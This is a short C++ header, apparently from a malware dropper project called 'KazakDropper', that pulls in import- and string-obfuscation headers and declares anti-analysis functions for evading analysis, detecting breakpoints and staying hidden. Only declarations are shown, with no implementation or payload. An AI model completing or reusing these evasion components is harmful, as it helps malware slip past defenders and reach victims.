#pragma once

#include <Windows.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <thread>

#include "../headers/obfuscation/li.h"
#include "../headers/obfuscation/xor.h"



namespace KazakDropper
{
	void EvadeAnalysis();
	BOOL IsBp(const char* lpszModule, const char* lpszFunction);

	void Stealth();
}